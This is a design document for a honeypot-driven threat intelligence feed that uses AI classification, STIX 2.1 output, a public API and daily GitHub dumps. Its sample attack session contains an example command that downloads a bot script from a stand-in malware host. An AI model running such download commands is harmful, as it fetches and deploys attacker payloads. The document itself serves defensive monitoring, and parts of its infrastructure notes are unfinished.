# Cowrie AI Threat Intel Feed — Complete Design

## Overview

A free, open-source threat intelligence feed powered by a Cowrie SSH honeypot with AI-enriched attack classification. Publishes structured IOCs (Indicators of Compromise) in STIX 2.1 format via a public REST API and daily GitHub dumps.

**GitHub repo name:** `honeypot-threat-intel`
**Public API:** `https://threat-intel.101904.xyz` (via Caddy + Cloudflare Tunnel)
**Update frequency:** Real-time API + daily batch dumps

---

## Architecture

```
┌─────────────┐     ┌──────────┐     ┌──────────────┐     ┌─────────────────┐
│   Cowrie     │────▶│  Wazuh   │────▶│  N8N SOAR    │────▶│  Threat Intel   │
│  (VM 113)   │     │ (CT 108) │     │  (CT 103)    │     │  API (CT 103)   │
│             │     │          │     │              │     │                 │
│ cowrie.json  │     │ Alert    │     │ AI Enrichment│     │ FastAPI + SQLite │
│ downloads/   │     │ Level 10+│     │ STIX Bundle  │     │ STIX 2.1 JSON   │
└─────────────┘     └──────────┘     └──────────────┘     └─────────────────┘
                                           │                       │
                                           ▼                       ▼
                                    ┌──────────────┐     ┌─────────────────┐
                                    │   Ollama      │     │  GitHub Actions  │
                                    │  (Workstation)│     │  Daily Dumps     │
                                    │  Mistral 3.2  │     │  STIX Bundles    │
                                    └──────────────┘     └─────────────────┘
```

---

## Data Pipeline

### Stage 1: Collection (already exists)

Cowrie logs every SSH session to `/home/cowrie/cowrie/var/log/cowrie/cowrie.json`:
- `cowrie.session.connect` — attacker IP, port, timestamp
- `cowrie.client.version` — SSH client string
- `cowrie.client.kex` — HASSH fingerprint (SSH client fingerprinting)
- `cowrie.login.failed` / `cowrie.login.success` — credentials
- `cowrie.command.input` — commands executed
- `cowrie.session.file_download` — malware URLs + SHA256 hashes

**Current volume:** ~164 sessions, 83 unique IPs, 60 commands, 134 malware samples in current log rotation.

### Stage 2: Session Assembly (new — N8N workflow)

**Trigger:** N8N cron every 15 minutes, reads new Cowrie log entries.

The raw log is per-event. We need to assemble complete **attack sessions**:

```json
{
  "session_id": "48a1176334c4",
  "src_ip": "165.154.225.20",
  "timestamp_start": "2026-02-20T16:55:18Z",
  "timestamp_end": "2026-02-20T16:55:19Z",
  "duration_seconds": 0.3,
  "ssh_client": "SSH-2.0-Go",
  "hassh": "9052c4ab4164c78256e71143dcfc7eac",
  "credentials_attempted": [
    {"username": "root", "password": "123456", "success": false},
    {"username": "root", "password": "root", "success": true}
  ],
  "commands": [
    "uname -a",
    "cat /proc/cpuinfo",
    "wget http://malware.example.com/bot.sh"
  ],
  "downloads": [
    {
      "url": "http://malware.example.com/bot.sh",
      "sha256": "abc123...",
      "size_bytes": 449061
    }
  ]
}
```

**Implementation:** N8N Code node with JavaScript:
1. Read `/home/cowrie/cowrie/var/log/cowrie/cowrie.json` via SSH (or Wazuh API)
2. Track last-processed line in a state file
3. Group events by `session` field
4. Output assembled sessions

### Stage 3: AI Enrichment (new — N8N → Ollama)

For each assembled session, query Mistral Small 3.2 via Ollama:

**Prompt:**
```
Analyze this SSH honeypot session and classify it. Respond in JSON only.

Session data:
{session_json}

Respond with:
{
  "attack_type": "brute_force|credential_stuffing|recon|malware_deployment|cryptominer|botnet_recruitment|lateral_movement|data_exfil|unknown",
  "mitre_techniques": ["T1110.001", "T1059.004"],
  "mitre_names": ["Brute Force: Password Guessing", "Command and Scripting Interpreter: Unix Shell"],
  "threat_level": "low|medium|high|critical",
  "summary": "One-line human-readable summary of what the attacker did",
  "iocs": {
    "ips": ["1.2.3.4"],
    "urls": ["http://malware.example.com/bot.sh"],
    "hashes": ["sha256:abc123"],
    "credentials": ["root:123456"]
  }
}
```

**MITRE ATT&CK mappings we'll see most:**
| Technique | ID | When |
|---|---|---|
| Brute Force: Password Guessing | T1110.001 | Failed login attempts |
| Valid Accounts | T1078 | Successful login |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Command execution |
| Ingress Tool Transfer | T1105 | wget/curl downloads |
| Resource Hijacking (Cryptomining) | T1496 | Cryptominer deployment |
| System Information Discovery | T1082 | uname, /proc reads |
| Account Discovery | T1087 | cat /etc/passwd |
| Boot or Logon Autostart | T1547 | cron/rc.local persistence |

### Stage 4: STIX 2.1 Bundle Generation (new — N8N Code node)

Each enriched session becomes a STIX 2.1 bundle:

```json
{
  "type": "bundle",
  "id": "bundle--uuid",
  "objects": [
    {
      "type": "indicator",
      "id": "indicator--uuid",
      "created": "2026-02-20T16:55:18Z",
      "name": "Malicious SSH source: 165.154.225.20",
      "description": "Brute force SSH attack followed by cryptominer deployment",
      "pattern": "[ipv4-addr:value = '165.154.225.20']",
      "pattern_type": "stix",
      "valid_from": "2026-02-20T16:55:18Z",
      "valid_until": "2026-02-27T16:55:18Z",
      "labels": ["malicious-activity"],
      "confidence": 85,
      "kill_chain_phases": [
        {"kill_chain_name": "mitre-attack", "phase_name": "credential-access"}
      ]
    },
    {
      "type": "observed-data",
      "id": "observed-data--uuid",
      "first_observed": "2026-02-20T16:55:18Z",
      "last_observed": "2026-02-20T16:55:19Z",
      "number_observed": 1,
      "object_refs": ["ipv4-addr--uuid", "network-traffic--uuid"]
    },
    {
      "type": "attack-pattern",
      "id": "attack-pattern--uuid",
      "name": "Brute Force: Password Guessing",
      "external_references": [
        {"source_name": "mitre-attack", "external_id": "T1110.001"}
      ]
    },
    {
      "type": "malware",
      "id": "malware--uuid",
      "name": "Unknown ELF binary",
      "is_family": false,
      "hashes": {"SHA-256": "abc123..."},
      "labels": ["trojan"]
    },
    {
      "type": "relationship",
      "id": "relationship--uuid",
      "relationship_type": "indicates",
      "source_ref": "indicator--uuid",
      "target_ref": "attack-pattern--uuid"
    }
  ]
}
```

### Stage 5: Storage (new — SQLite in CT 103)

**Database:** `/opt/stacks/threat-intel/data/threat_intel.db`

```sql
CREATE TABLE sessions (
    id TEXT PRIMARY KEY,           -- cowrie session id
    src_ip TEXT NOT NULL,
    src_port INTEGER,
    timestamp_start TEXT NOT NULL,
    timestamp_end TEXT,
    duration_seconds REAL,
    ssh_client TEXT,
    hassh TEXT,
    attack_type TEXT,              -- AI classification
    threat_level TEXT,             -- low/medium/high/critical
    mitre_techniques TEXT,         -- JSON array
    summary TEXT,                  -- AI one-liner
    stix_bundle TEXT,              -- full STIX 2.1 JSON
    raw_session TEXT,              -- assembled session JSON
    created_at TEXT DEFAULT (datetime('now')),
    enriched_at TEXT
);

CREATE TABLE indicators (
    id TEXT PRIMARY KEY,           -- STIX indicator id
    session_id TEXT REFERENCES sessions(id),
    type TEXT NOT NULL,            -- ipv4-addr, url, file-hash, credential
    value TEXT NOT NULL,
    first_seen TEXT,
    last_seen TEXT,
    times_seen INTEGER DEFAULT 1,
    threat_level TEXT,
    stix_object TEXT               -- individual STIX object JSON
);

CREATE TABLE malware_samples (
    sha256 TEXT PRIMARY KEY,
    session_id TEXT,
    url TEXT,
    size_bytes INTEGER,
    file_type TEXT,                -- from `file` command
    first_seen TEXT,
    vt_detection_ratio TEXT,      -- if VirusTotal checked
    stix_object TEXT
);

CREATE INDEX idx_indicators_value ON indicators(value);
CREATE INDEX idx_indicators_type ON indicators(type);
CREATE INDEX idx_sessions_src_ip ON sessions(src_ip);
CREATE INDEX idx_sessions_attack_type ON sessions(attack_type);
CREATE INDEX idx_sessions_timestamp ON sessions(timestamp_start);
```

### Stage 6: REST API (new — FastAPI in Docker on CT 103)

**Base URL:** `https://threat-intel.101904.xyz/api/v1`

#### Endpoints

```
GET  /api/v1/feed
     ?since=2026-02-20T00:00:00Z    # only IOCs after this time
     &type=ipv4-addr|url|hash|all    # filter by indicator type
     &threat_level=high,critical     # filter by severity
     &attack_type=cryptominer        # filter by classification
     &format=stix|csv|json           # output format (default: stix)
     &limit=100                      # pagination

GET  /api/v1/feed/stix
     Full STIX 2.1 bundle of all active indicators (TAXII-lite)

GET  /api/v1/indicators
     Flat list of IOCs with metadata

GET  /api/v1/indicators/{value}
     Lookup a specific IP/hash/URL — returns all sessions involving it

GET  /api/v1/sessions
     ?since=...&attack_type=...&limit=...
     Browse enriched attack sessions

GET  /api/v1/sessions/{id}
     Full session detail with STIX bundle

GET  /api/v1/stats
     Dashboard data: total sessions, top attack types, top IPs,
     credential frequency, MITRE heatmap, daily volume

GET  /api/v1/health
     API health + last update timestamp
```

#### Rate Limiting
- 100 requests/minute per IP (unauthenticated)
- No API key required (free/open)

#### Response Example: GET /api/v1/feed?format=json&since=2026-02-20

```json
{
  "feed_id": "honeypot-svr04",
  "generated_at": "2026-02-20T17:00:00Z",
  "indicator_count": 42,
  "indicators": [
    {
      "type": "ipv4-addr",
      "value": "165.154.225.20",
      "first_seen": "2026-02-20T16:55:18Z",
      "last_seen": "2026-02-20T16:55:18Z",
      "times_seen": 1,
      "threat_level": "high",
      "attack_types": ["cryptominer"],
      "mitre_techniques": ["T1110.001", "T1059.004", "T1496"],
      "summary": "Brute forced SSH with root:123456, deployed XMRig cryptominer"
    }
  ]
}
```

### Stage 7: GitHub Daily Dumps (new — OpenClaw cron)

**Repository:** `github.com/tristanstiller/honeypot-threat-intel`

**Structure:**
```
honeypot-threat-intel/
├── README.md                    # Project description, methodology, usage
├── LICENSE                      # MIT
├── feeds/
│   ├── daily/
│   │   ├── 2026-02-20.stix.json   # Full STIX bundle for the day
│   │   ├── 2026-02-20.csv         # Flat IOC list (IP,type,threat_level,mitre)
│   │   └── 2026-02-20.json        # Simple JSON format
│   ├── latest.stix.json           # Always current day
│   └── indicators.csv             # Rolling 30-day flat list
├── analysis/
│   ├── mitre-heatmap.json         # ATT&CK technique frequency
│   ├── credential-wordlist.txt    # Top attempted credentials
│   └── monthly-report.md          # AI-generated monthly summary
├── malware/
│   └── hashes.txt                 # SHA256 list (no binaries)
└── docs/
    ├── methodology.md             # How data is collected + enriched
    ├── stix-schema.md             # STIX object definitions used
    └── api.md                     # Public API documentation
```

**Cron:** OpenClaw daily at 23:00 UTC (5 PM CST):
1. Export day's STIX bundles from SQLite
2. Generate CSV + JSON flat files
3. Update `latest.stix.json`
4. Git commit + push

---

## Implementation Plan

### Container: threat-intel (Docker stack on CT 103)

```yaml
# /opt/stacks/threat-intel/compose.yml
services:
  threat-intel-api:
    image: python:3.12-slim
    container_name: threat-intel-api
    restart: unless-stopped
    working_dir: /app
    volumes:
      - ./app:/app
      - ./data:/data
    ports:
      - "8099:8099"
    environment:
      - DATABASE_PATH=/data/threat_intel.db
      - OLLAMA_URL=http://192.168.10.97:11434
      - OLLAMA_MODEL=mistral-small3.2:24b
    command: >
      bash -c "pip install fastapi uvicorn aiohttp aiosqlite &&
               uvicorn main:app --host 0.0.0.0 --port 8099"
```

### Caddy reverse proxy addition (CT 104)

```
threat-intel.101904.xyz {
    import cloudflare_tls
    import access_log
    reverse_proxy 192.168.1.199:8099 {
        # Docker CT 103 IP
    }
}
```

Wait — CT 103 is Docker, so the API container port maps to CT 103's IP. Need to check:

### Cloudflare Tunnel addition

Add `threat-intel.101904.xyz` → `https://threat-intel.101904.xyz` in the tunnel config (CT 105).

### Technitium DNS

Add `threat-intel.101904.xyz` → `192.168.1.7` (Caddy).

### N8N Workflow: Threat Intel Enrichment Pipeline

**Workflow ID:** (new, to be created)
**Trigger:** Schedule — every 15 minutes

```
[Schedule Trigger]
       │
       ▼
[SSH: Read cowrie.json]──▶[Code: Get new lines since last offset]
       │
       ▼
[Code: Assemble sessions]
       │
       ▼
[Loop: For each session]
       │
       ├──▶[HTTP: Ollama AI enrichment]
       │
       ├──▶[Code: Generate STIX bundle]
       │
       ├──▶[HTTP: IP geolocation (ipwho.is)]
       │
       └──▶[Code: Insert into SQLite]
              │
              ▼
       [HTTP: POST summary to Discord #runner]
```

**State tracking:** `/opt/stacks/threat-intel/data/pipeline_state.json`
```json
{
  "last_line_offset": 727,
  "last_run": "2026-02-20T17:00:00Z",
  "sessions_processed": 164
}
```

---

## File Structure on CT 103

```
/opt/stacks/threat-intel/
├── compose.yml
├── app/
│   ├── main.py              # FastAPI application
│   ├── models.py            # Pydantic models
│   ├── stix.py              # STIX 2.1 bundle generator
│   ├── enrichment.py        # Ollama AI enrichment client
│   ├── database.py          # SQLite operations
│   └── requirements.txt     # fastapi, uvicorn, aiohttp, aiosqlite
├── data/
│   ├── threat_intel.db      # SQLite database
│   └── pipeline_state.json  # N8N pipeline state
└── github/
    └── (git repo clone for daily pushes)
```

---

## Security Considerations

1. **No PII exposure:** Attacker IPs are public by nature (they're attacking you). No victim data.
2. **No malware binaries:** Only SHA256 hashes published, never raw files.
3. **No internal IPs leaked:** Scrub `dst_ip` (192.168.99.10) from all output — replace with sensor name.
4. **Rate limiting:** 100 req/min prevents abuse.
5. **Read-only API:** No write endpoints. SQLite is behind the API, not directly exposed.
6. **Authentik SSO:** NOT applied to this endpoint (public API).

---

## Resume Value

This project demonstrates:
- **Threat Intelligence** — STIX/TAXII, IOC management, MITRE ATT&CK mapping
- **Security Operations** — Honeypot deployment, SIEM integration, SOAR automation
- **AI/ML in Security** — LLM-powered attack classification and TTP extraction
- **API Development** — RESTful API design, rate limiting, multiple output formats
- **DevOps** — Docker, CI/CD (GitHub Actions), infrastructure as code
- **Data Engineering** — Log pipeline, ETL, structured data from unstructured logs

Can be referenced as:
> "Built an AI-powered threat intelligence platform that processes live SSH honeypot data through an automated enrichment pipeline, classifies attacks using MITRE ATT&CK framework via local LLM inference, and publishes structured STIX 2.1 IOC feeds via a public REST API."

---

## Implementation Order

1. **FastAPI app + SQLite schema** — skeleton API with /health endpoint
2. **N8N session assembly workflow** — read cowrie.json, group by session
3. **AI enrichment integration** — Ollama classification per session
4. **STIX bundle generation** — convert enriched sessions to STIX 2.1
5. **API endpoints** — /feed, /indicators, /sessions, /stats
6. **Caddy + DNS + Tunnel** — expose publicly
7. **GitHub repo + daily dump cron** — automated publishing
8. **Backfill** — process existing cowrie.json + historical logs
9. **Landing page** — simple HTML at root explaining the project
10. **README + documentation** — methodology, API docs, schema docs

Estimated build time: 2-3 sessions (I build, you review + deploy).
